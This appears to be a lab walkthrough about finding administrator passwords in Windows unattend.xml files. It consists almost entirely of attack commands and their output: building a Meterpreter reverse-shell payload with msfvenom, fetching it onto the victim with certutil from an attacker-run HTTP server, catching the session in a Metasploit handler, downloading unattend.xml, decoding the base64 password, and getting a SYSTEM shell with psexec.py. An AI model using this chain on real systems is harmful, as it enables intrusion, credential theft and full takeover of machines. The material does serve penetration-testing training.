# Searching for passwords in Windows configuration files

The unattended Windows setup utility will typically utilize one of the following configuration files:

* C:\Windows\Panther\Unattend.xml
* C:\Windows\Panther\Autounattend.xml

Kali-Machine:

```sh
root@attackdefense:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.26.2 LPORT=1234 -f exe>payload.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
root@attackdefense:~# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

Victim:

```sh
C:\Users\student\Desktop>certutil -urlcache -f http://10.10.26.2/payload.exe payload.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

kali-machine:

```sh
msf5 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.10.26.2
LHOST => 10.10.26.2
msf5 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.26.2:1234 
[*] Sending stage (201283 bytes) to 10.5.28.128
[*] Meterpreter session 1 opened (10.10.26.2:1234 -> 10.5.28.128:49780) at 2024-01-02 14:44:27 +0530

meterpreter > 

meterpreter > cd C:\\
meterpreter > cd Windows
meterpreter > cd Panther
meterpreter > dir
Listing: C:\Windows\Panther
===========================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100666/rw-rw-rw-  68        fil   2020-10-27 10:43:44 +0530  Contents0.dir
100666/rw-rw-rw-  12038     fil   2018-11-15 05:35:39 +0530  DDACLSys.log
100666/rw-rw-rw-  24494     fil   2020-10-27 10:43:44 +0530  MainQueueOnline0.que
40777/rwxrwxrwx   0         dir   2018-11-14 12:25:59 +0530  Unattend
40777/rwxrwxrwx   0         dir   2018-11-15 05:35:25 +0530  UnattendGC
40777/rwxrwxrwx   0         dir   2018-11-15 05:38:25 +0530  actionqueue
100666/rw-rw-rw-  2229      fil   2018-11-15 05:35:28 +0530  diagerr.xml
100666/rw-rw-rw-  4296      fil   2018-11-15 05:35:28 +0530  diagwrn.xml
100666/rw-rw-rw-  10006528  fil   2018-11-15 05:33:39 +0530  setup.etl
40777/rwxrwxrwx   0         dir   2018-11-15 05:35:28 +0530  setup.exe
100666/rw-rw-rw-  83991     fil   2018-11-15 05:35:28 +0530  setupact.log
100666/rw-rw-rw-  142       fil   2018-11-15 05:35:28 +0530  setuperr.log
100666/rw-rw-rw-  16640     fil   2020-10-27 10:43:04 +0530  setupinfo
100666/rw-rw-rw-  3519      fil   2020-10-29 10:29:18 +0530  unattend.xml

meterpreter > 

meterpreter > download unattend.xml
[*] Downloading: unattend.xml -> unattend.xml
[*] Downloaded 3.44 KiB of 3.44 KiB (100.0%): unattend.xml -> unattend.xml
[*] download   : unattend.xml -> unattend.xml

```

cat unattend.xml:

<pre class="language-sh"><code class="lang-sh">&#x3C;AutoLogon>
                &#x3C;Password>
<strong>                    &#x3C;Value>QWRtaW5AMTIz&#x3C;/Value> # base 64 encoded
</strong>                    &#x3C;PlainText>false&#x3C;/PlainText>
                &#x3C;/Password>
                &#x3C;Enabled>true&#x3C;/Enabled>
<strong>                &#x3C;Username>administrator&#x3C;/Username>
</strong>            &#x3C;/AutoLogon>
</code></pre>

```sh
root@attackdefense:~# echo "QWRtaW5AMTIz" > pass.txt
root@attackdefense:~# base64 -d pass.txt    
Admin@123
root@attackdefense:~# 
root@attackdefense:~# psexec.py Administrator@10.5.28.128 
Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation

Password:
[*] Requesting shares on 10.5.28.128.....
[*] Found writable share ADMIN$
[*] Uploading file xrEEbfEL.exe
[*] Opening SVCManager on 10.5.28.128.....
[*] Creating service dZih on 10.5.28.128.....
[*] Starting service dZih.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
